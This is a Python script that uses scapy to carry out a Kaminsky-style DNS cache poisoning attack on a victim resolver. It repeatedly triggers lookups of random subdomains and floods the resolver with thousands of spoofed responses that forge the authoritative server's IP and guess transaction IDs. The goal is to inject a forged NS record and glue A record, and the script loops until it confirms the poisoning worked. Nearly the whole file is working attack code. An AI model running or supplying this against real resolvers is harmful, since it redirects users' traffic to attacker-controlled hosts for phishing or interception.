# ======== kaminskyLoud.py (Further Corrected) ========
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sr1, send
import utils
from vars import ccolors
import datetime
import time
import os
from multiprocessing import Pool, cpu_count

def send_packets(packets):
    """Worker function to send a batch of packets."""
    send(packets, verbose=False)

def loud(args):
    poisoned = False

    # 1. Craft the SPOOFED DNS records to be injected.
    #    NS record points the target domain to a fake authoritative server.
    #    A record (glue) provides the IP for that fake server.
    spoofed_ns_rec = DNSRR(rrname=args.targetDomain, type='NS', rdata=args.soaDomain[0], ttl=args.ttl)
    spoofed_a_rec = DNSRR(rrname=args.soaDomain[0], type='A', rdata=args.addressToForge, ttl=args.ttl)

    # 2. Set up the multiprocessing pool.
    num_processes = cpu_count()
    print(f"Initializing multiprocessing pool with {num_processes} worker processes.")
    pool = Pool(processes=num_processes)
    
    print("Starting loud attack. This may take a while...")
    attack_count = 0

    while not poisoned:
        attack_count += 1
        
        # 3. Create a UNIQUE, non-existent subdomain for this attack round.
        query_domain = utils.getRandomSubdomain() + args.targetDomain
        print(f"\rAttack round {attack_count}: Triggering query for {query_domain}", end="")

        # 4. Craft the TRIGGER query packet. This is sent ONCE per round to the victim.
        trigger_pkt = IP(dst=args.victim) / UDP(sport=utils.getRandomPort()) / DNS(rd=1, qd=DNSQR(qname=query_domain))
        
        # 5. Prepare a large BATCH of spoofed response packets for this round.
        #    - Source IP is the REAL authoritative server.
        #    - Question section matches the trigger query.
        #    - TXID and destination port are randomized to guess the real query's parameters.
        amount = 5000  # Number of spoofed packets per attack round.
        packets_to_send = []
        for i in range(amount):
            spoofed_response = IP(src=args.soaIP[0], dst=args.victim) / \
                               UDP(sport=53, dport=10000) / \
                               DNS(id=utils.getRandomTXID(),
                                   qr=1, aa=1, 
                                   qd=DNSQR(qname=query_domain), 
                                   ns=spoofed_ns_rec,
                                   ar=spoofed_a_rec)
            packets_to_send.append(spoofed_response)
            
        # Split the packets into chunks for each worker process.
        chunk_size = len(packets_to_send) // num_processes
        chunks = [packets_to_send[i:i + chunk_size] for i in range(0, len(packets_to_send), chunk_size)]

        # 6. Send the trigger query. This makes the victim query the authoritative server.
        send(trigger_pkt, verbose=False)

        # 7. IMMEDIATELY launch the parallel barrage of spoofed responses.
        #    This is the race condition.
        pool.map_async(send_packets, chunks)
        
        # 8. Briefly wait, then check if the cache has been poisoned.
        time.sleep(0.5) # Give some time for packets to travel and be processed
        check_pkt = IP(dst=args.victim) / UDP(sport=utils.getRandomPort()) / DNS(rd=1, qd=DNSQR(qname=args.soaDomain[0], qtype='A'))
        ans = sr1(check_pkt, verbose=False, timeout=1)
        
        if ans and ans.haslayer(DNS) and ans.an and ans.an.rdata == args.addressToForge:
            poisoned = True
            print("\n" + ccolors.OKGREEN + f"SUCCESS! Cache poisoned for {args.soaDomain[0]} -> {args.addressToForge}" + ccolors.NC)

    # 9. Clean up the process pool.
    pool.close()
    pool.join()

    deltaTime = datetime.datetime.now() - args.startTime
    print(ccolors.WARNING + 'It took: ' + str(deltaTime) + ccolors.NC)